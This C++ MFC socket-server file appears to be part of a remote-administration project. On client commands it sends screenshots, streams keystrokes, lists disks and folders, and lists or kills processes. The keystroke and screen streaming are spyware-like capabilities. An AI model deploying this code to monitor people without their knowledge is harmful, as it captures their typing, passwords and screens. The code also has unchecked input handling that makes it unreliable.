// ReceivingSocket.cpp : implementation file
//

#include "pch.h"
#include "Server.h"
#include "ReceivingSocket.h"

#define PRE_AGREED_PORT     8686
#define SEND_BUFFER_SIZE    4096
#define TIMER_ID_KEYSTROKE  1

namespace fs = std::filesystem;

std::string getFirstWord(char* str) {
    std::string firstWord;
    int i = 0;
    while (str[i] != '\0' && str[i] != ' ') {
        firstWord += str[i];
        i++;
    }
    return firstWord;
}

std::string getSecondWord(char* input) {
    std::istringstream iss(input);
    std::string word1, word2;
    iss >> word1 >> word2;
    return word2;
}

// CReceivingSocket

CReceivingSocket::CReceivingSocket()
{
    m_timerId = SetTimer(NULL, TIMER_ID_KEYSTROKE, 100, NULL);
}

CReceivingSocket::~CReceivingSocket()
{
}

std::string getFirstWord(const char* str) {
    std::string firstWord;
    int i = 0;
    while (str[i] != '\0' && str[i] != ' ') {
        firstWord += str[i];
        i++;
    }
    return firstWord;
}

std::string getSecondWord(const char* input) {
    std::istringstream iss(input);
    std::string word1, word2;
    iss >> word1 >> word2;
    return word2;
}

void CReceivingSocket::OnReceive(int nErrorCode)
{
    char buffer[256] = "";
	this->Receive(buffer, 256);
    buffer[strlen(buffer)] = '\0';
    
    CStringA strMsg(buffer); AfxMessageBox(strMsg);
    int len = MultiByteToWideChar(CP_UTF8, 0, strMsg, -1, NULL, 0);
    CStringW wstrMsg;
    int wideLen = MultiByteToWideChar(CP_UTF8, 0, strMsg, -1, wstrMsg.GetBuffer(len), len); MessageBoxW(nullptr, wstrMsg, L"Server", MB_OK);

	if (L"REQ_CSCR" == wstrMsg)
	{
		OnReceiveCapScreen(nErrorCode);
	}
    else if (L"REQ_KSTR" == wstrMsg)
    {
        OnReceiveKeystroke(nErrorCode);
    }
	else if (L"REQ_BDIR" == wstrMsg)
	{
        OnReceiveBrowseDisk(nErrorCode);
	}
    else if (strMsg.Left(CString("REQ_BDIR").GetLength()) == CString("REQ_BDIR"))
    {
        std::wstring wstrMsg_s(wstrMsg);
        OnReceiveBrowseDir(nErrorCode, (wstrMsg_s.substr(8, wstrMsg_s.length() - 8).c_str()));
    }
    else if (L"REQ_SPRO" == wstrMsg)
    {
        OnReceiveShowPro(nErrorCode);
    }
    else if (getFirstWord(strMsg) == "REQ_SPRO_KILL") {
        std::string PID = getSecondWord(strMsg);
        int Pid = std::stoi(PID);
        OnReceiveShowPro_Kill(nErrorCode, Pid);
    }
	CSocket::OnReceive(nErrorCode);
}


void CReceivingSocket::OnClose(int nErrorCode)
{
	// TODO: Add your specialized code here and/or call the base class
	//AfxMessageBox("Connection Closed!");
	Close();
	CSocket::OnClose(nErrorCode);
}

BOOL CReceivingSocket::OnReceiveCapScreen(int nErrorCode)
{
	ScreenCapture();
    // return value
    BOOL bRet = TRUE;
    // used to monitor the progress of a sending operation
    int fileLength, cbLeftToSend;
    // pointer to buffer for sending data
    // (memory is allocated after sending file size)
    BYTE* sendData = NULL;

    CFile sourceFile;
    CFileException fe;
    BOOL bFileIsOpen = FALSE;

    if (!(bFileIsOpen = sourceFile.Open("screenshot.bmp",
        CFile::modeRead | CFile::typeBinary, &fe)))
    {
        TCHAR strCause[256];
        fe.GetErrorMessage(strCause, 255);
        TRACE("SendFileToRemoteRecipient encountered an error while opening the local file\n"
            "\tFile name = %s\n\tCause = %s\n\tm_cause = %d\n\tm_IOsError = %d\n",
            fe.m_strFileName, strCause, fe.m_cause, fe.m_lOsError);

        /* you should handle the error here */

        bRet = FALSE;
        goto PreReturnCleanup;
    }

    // first send length of file

    fileLength = sourceFile.GetLength();
    fileLength = htonl(fileLength);

    cbLeftToSend = sizeof(fileLength);

    do
    {
        int cbBytesSent;
        BYTE* bp = (BYTE*)(&fileLength) + sizeof(fileLength) - cbLeftToSend;
        cbBytesSent = this->Send(bp, cbLeftToSend);

        // test for errors and get out if they occurred
        if (cbBytesSent == SOCKET_ERROR)
        {
            int iErr = ::GetLastError();
            TRACE("SendFileToRemoteRecipient returned a socket error while sending file length\n"
                "\tNumber of Bytes sent = %d\n"
                "\tGetLastError = %d\n", cbBytesSent, iErr);

            /* you should handle the error here */

            bRet = FALSE;
            goto PreReturnCleanup;
        }

        // data was successfully sent, so account
        // for it with already-sent data
        cbLeftToSend -= cbBytesSent;
    } while (cbLeftToSend > 0);


    // now send the file's data    
    sendData = new BYTE[SEND_BUFFER_SIZE];

    cbLeftToSend = sourceFile.GetLength();

    do
    {
        // read next chunk of SEND_BUFFER_SIZE bytes from file

        int sendThisTime, doneSoFar, buffOffset;

        sendThisTime = sourceFile.Read(sendData, SEND_BUFFER_SIZE);
        buffOffset = 0;

        do
        {
            doneSoFar = this->Send(sendData + buffOffset,
                sendThisTime);

            // test for errors and get out if they occurred
            if (doneSoFar == SOCKET_ERROR)
            {
                int iErr = ::GetLastError();
                TRACE("SendFileToRemoteRecipient returned a socket error  while sending chunked file data\n"
                        "\tNumber of Bytes sent = %d\n"
                        "\tGetLastError = %d\n", doneSoFar, iErr);

                /* you should handle the error here */

                bRet = FALSE;
                goto PreReturnCleanup;
            }

            // data was successfully sent,
            // so account for it with already-sent data

            buffOffset += doneSoFar;
            sendThisTime -= doneSoFar;
            cbLeftToSend -= doneSoFar;
        } while (sendThisTime > 0);

    } while (cbLeftToSend > 0);

PreReturnCleanup: // labelled goto destination

    // free allocated memory
    // if we got here from a goto that skipped allocation,
    // delete of NULL pointer
    // is permissible under C++ standard and is harmless
    delete[] sendData;

    if (bFileIsOpen)
        sourceFile.Close();
    // only close file if it's open (open might have failed above)

    //this->Close();

    return bRet;

}

void CReceivingSocket::OnReceiveKeystroke(int nErrorCode)
{
    // Continuously send the name of the keystroke that has been tapped to the client
    // while (flag)
    while (1)
    {   
        CString keystrokeName(Keystroke().c_str()); 
        if (keystrokeName != " ")
            this->Send(keystrokeName, keystrokeName.GetLength());
        if (keystrokeName == "[ESC]")
            break;
        Sleep(10);
    }
    //this->Close();
}

BOOL CReceivingSocket::OnReceiveBrowseDisk(int nErrorCode)
{
    std::vector<CStringW> diskList;
    BrowseDisk(diskList);

    // return value
    BOOL bRet = TRUE;

    CStringW wmsg = L"";
    for (CStringW disk : diskList) {
        wmsg = wmsg + disk + L"\n";
    }

    // Convert the CStringW object to a UTF - 8 encoded byte buffer using the WideCharToMultiByte
    int bufferSize = WideCharToMultiByte(CP_UTF8, 0, wmsg, wmsg.GetLength(), NULL, 0, NULL, NULL);
    std::vector<char> msg(bufferSize);
    WideCharToMultiByte(CP_UTF8, 0, wmsg, wmsg.GetLength(), msg.data(), bufferSize, NULL, NULL);
    int cbBytesSent = this->Send(msg.data(), msg.size());

    // test for errors and get out if they occurred
    if (cbBytesSent == SOCKET_ERROR)
    {
        int iErr = ::GetLastError();
        TRACE("SendFileToRemoteRecipient returned a socket error while sending file length\n"
            "\tNumber of Bytes sent = %d\n"
            "\tGetLastError = %d\n", cbBytesSent, iErr);
        bRet = FALSE;
        return bRet;
    }
    return bRet;
}

void CReceivingSocket::OnReceiveBrowseDir(int nErrorCode, CStringW path) 
{
    std::vector<CStringW> dirList;
    BOOL browsable = BrowseDir(path, dirList);
    
    if (browsable)
    {
        CStringW wmsg = L"";
        for (auto dir : dirList) {
            CStringW formattedDir;
            formattedDir.Format(L"%s\n", dir.GetString());
            wmsg += formattedDir;
        }   

        int lenW = wmsg.GetLength(); // Length of the CStringW
        LPCWSTR ptrW = wmsg.GetBuffer(); // Pointer to the wide char string buffer
        int lenUTF8 = WideCharToMultiByte(CP_UTF8, 0, ptrW, lenW, NULL, 0, NULL, NULL); // Length of the required UTF-8 encoded byte stream
        LPSTR ptrUTF8 = new char[lenUTF8 + 1]; // Allocate a buffer for the UTF-8 encoded byte stream
        WideCharToMultiByte(CP_UTF8, 0, ptrW, lenW, ptrUTF8, lenUTF8, NULL, NULL); // Convert the wide char string to UTF-8
        ptrUTF8[lenUTF8] = '\0'; // Null-terminate the UTF-8 encoded byte stream
        wmsg.ReleaseBuffer(); // Release the buffer obtained from GetBuffer()

        CStringA msg(ptrUTF8);
        int cbBytesSent = this->Send(msg.GetBuffer(msg.GetLength()), msg.GetLength());
    }
    else
    {
        CString msg = "Invalid path!";
        this->Send(msg.GetBuffer(msg.GetLength()), msg.GetLength());
        AfxMessageBox(msg);
    }
}

bool CReceivingSocket::OnReceiveShowPro_Kill(int nErrorCode, int Pid) {
    return killProcess(Pid);
}

void CReceivingSocket::OnReceiveShowPro(int nErrorCode) {
    CString msg = "";

    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        msg = "Failed to create process snapshot.\n";
        Send(msg.GetBuffer(msg.GetLength()), msg.GetLength(), 0);
        return;
    }

    // Initialize the PROCESSENTRY32 structure
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process
    if (!Process32First(hProcessSnap, &pe32)) {
        msg = "Failed to retrieve process information.";
        Send(msg.GetBuffer(msg.GetLength()), msg.GetLength(), 0);
        CloseHandle(hProcessSnap);
        return;
    }

    // Print the process ID and process name of each process
    do {
        std::string processName(pe32.szExeFile);
        if (processName != "System Idle Process" && processName != "System") {
            CString processIdStr;
            processIdStr.Format(_T("%d"), pe32.th32ProcessID);
            CString processNameStr(processName.c_str());
            msg = msg + processNameStr.GetString() + "/" + processIdStr.GetString() + "/";
        }
    } while (Process32Next(hProcessSnap, &pe32));

    // Close the process snapshot handle
    CloseHandle(hProcessSnap);

    //MessageBox((LPCTSTR)msg, "Server");

    Send(msg.GetBuffer(msg.GetLength()), msg.GetLength(), 0);
}


